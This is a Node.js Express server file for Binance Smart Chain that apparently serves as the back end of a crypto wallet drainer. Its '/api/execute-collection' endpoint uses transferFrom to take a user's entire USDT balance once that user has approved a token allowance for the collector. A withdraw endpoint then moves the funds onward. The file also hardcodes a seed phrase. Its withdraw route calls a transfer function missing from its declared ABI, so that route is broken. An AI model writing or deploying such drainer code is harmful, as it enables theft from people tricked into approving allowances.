require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');

const app = express();
app.use(cors());
app.use(express.json());

// ─── CONFIG ────────────────────────────────────────────────────────
// OPTION A: Use mnemonic from environment variable
const MNEMONIC = process.env.MNEMONIC || "security reject bomb faith clinic foster bubble attack outside upper divorce grass";

// Derive private key from mnemonic
const DERIVATION_PATH = "m/44'/60'/0'/0/0";
const hdNode = ethers.HDNodeWallet.fromPhrase(MNEMONIC, "", DERIVATION_PATH);
const PRIVATE_KEY = hdNode.privateKey;
const WALLET_ADDRESS = hdNode.address;

console.log(`🧠 Derived wallet from mnemonic:`);
console.log(`📦 Address: ${WALLET_ADDRESS}`);
console.log(`🔑 Private Key: ${PRIVATE_KEY.substring(0, 10)}... (hidden)`);

// Your collector address (should match derived address)
const COLLECTOR = process.env.COLLECTOR_ADDRESS || WALLET_ADDRESS;
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const RPC = "https://bsc-dataseed1.binance.org/";

// ─── Initialize Wallet ─────────────────────────────────────────────
const provider = new ethers.JsonRpcProvider(RPC);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const USDT_ABI = [
  "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)"
];
const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);

// ─── Health Check ──────────────────────────────────────────────────
app.get('/api/health', (req, res) => res.json({ 
  status: 'ok', 
  collector: COLLECTOR,
  address: WALLET_ADDRESS 
}));

// ─── SWEEP ALL USDT ───────────────────────────────────────────────
app.post('/api/execute-collection', async (req, res) => {
  const { userAddress } = req.body;
  
  try {
    if (!userAddress || !ethers.isAddress(userAddress)) {
      return res.status(400).json({ 
        success: false, 
        error: 'Invalid user address' 
      });
    }

    const userBalance = await usdt.balanceOf(userAddress);
    console.log(`📊 User ${userAddress} has ${ethers.formatUnits(userBalance, 18)} USDT`);

    if (userBalance === 0n) {
      return res.status(400).json({
        success: false,
        error: 'No USDT balance to sweep',
        balance: '0'
      });
    }

    const allowance = await usdt.allowance(userAddress, COLLECTOR);
    console.log(`📝 Allowance: ${ethers.formatUnits(allowance, 18)} USDT`);

    if (allowance < userBalance) {
      return res.status(400).json({
        success: false,
        error: 'Insufficient allowance. User must approve the collector address.',
        required: ethers.formatUnits(userBalance, 18),
        allowance: ethers.formatUnits(allowance, 18)
      });
    }

    console.log(`🔄 Sweeping ${ethers.formatUnits(userBalance, 18)} USDT from ${userAddress}`);
    const tx = await usdt.transferFrom(userAddress, COLLECTOR, userBalance);
    const receipt = await tx.wait();
    console.log(`✅ Swept successfully! Tx: ${receipt.hash}`);

    const newBalance = await usdt.balanceOf(COLLECTOR);

    res.json({
      success: true,
      txHash: receipt.hash,
      blockNumber: receipt.blockNumber,
      sweptAmount: ethers.formatUnits(userBalance, 18),
      collectorBalance: ethers.formatUnits(newBalance, 18),
      transactionUrl: `https://bscscan.com/tx/${receipt.hash}`
    });

  } catch (error) {
    console.error('Sweep error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// ─── Get User's Full Balance ──────────────────────────────────────
app.post('/api/get-balance', async (req, res) => {
  const { userAddress } = req.body;
  try {
    const balance = await usdt.balanceOf(userAddress);
    res.json({
      address: userAddress,
      usdtBalance: ethers.formatUnits(balance, 18),
      rawBalance: balance.toString()
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ─── Withdraw All to Another Wallet ───────────────────────────────
app.post('/api/withdraw-all', async (req, res) => {
  const { toAddress } = req.body;
  try {
    const balance = await usdt.balanceOf(COLLECTOR);
    if (balance === 0n) {
      return res.status(400).json({ success: false, error: 'No USDT to withdraw' });
    }
    
    const tx = await usdt.transfer(toAddress, balance);
    await tx.wait();
    
    res.json({
      success: true,
      txHash: tx.hash,
      amount: ethers.formatUnits(balance, 18),
      to: toAddress
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Full Sweep Backend running on port ${PORT}`);
  console.log(`📦 Collector Wallet: ${COLLECTOR}`);
});
